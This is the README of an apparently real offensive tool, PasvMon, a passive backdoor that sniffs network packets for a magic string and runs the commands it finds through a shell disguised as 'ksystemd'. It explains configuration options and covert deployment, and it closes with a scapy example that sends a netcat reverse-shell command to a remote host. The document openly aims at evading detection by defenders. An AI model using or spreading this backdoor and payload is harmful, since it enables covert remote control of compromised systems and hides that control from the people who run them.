pasvmon
=======
PasvMon is a quiet little backdoor which passively sniffs network traffic for
commands.  When it sees something it considers a command, it forks a handler
which runs it.  The practical upshot is that there's nothing in netstat's
output for a hyperactive defender to catch, and it's reasonably flexible, as
far as firewall rules are concerned.

Configuration
-------------
All configuration is done by editing the source, and recompiling.  The relevant
options are:

The network device on which to sniff packets.  On Linux, this can also be
`"any"` to sniff on all interfaces.
```c
#define DEVICE "eth0"                        /* Capture device */
```

A BPF filter describing the packets PasvMon should expect to contain commands.
This is used to reduce the number of packets processed to a reasonable level,
so it should be somewhat specific.
```c
#define FILTER "dst port 80 and src port 80" /* BPF filter */
```

The flag used to search for a command.  This makes it a bit harder for random
data to be picked up as a command, though it's technically possible.
```c
#define MAGICN "COMMANDCOMMAND"              /* Magic flag */
```

Name which `/bin/sh` will have in the process list.  It'll also have `-c` and
the command after it, but this is useful if you have a rootkit or ps wrapper
which keys on strings in process names.
```c
#define SHNAME "ksystemd"                    /* Name for child */
```

Number of bytes to allocate for the command buffer.  Probably won't need to
change this in most cases.
```c
#define BUFLEN 65535                         /* Command buffer size */
```

Deployment and Use
------------------
Deployment is simple, run it and background it.  You should probably pipe the
output to /dev/null, or a file for later collection.
```sh
./pasvmon >/dev/null 2>&1 &
```

[PasvCmd](../pasvcmd/) can be used to send commands to PasvMon.  Alternatively,
[scapy](https://github.com/phaethon/scapy) can be used, especially when strange
TCP things (like a SYNPSH) need to be done.  Example:
```python
send(IP(dst="10.100.101.12")/TCP(
        sport=80,dport=80,flags='SP')/
        'COMMANDCOMMANDnc 5.4.6.100 4444 | sh | nc 5.4.6.100 5555')
```
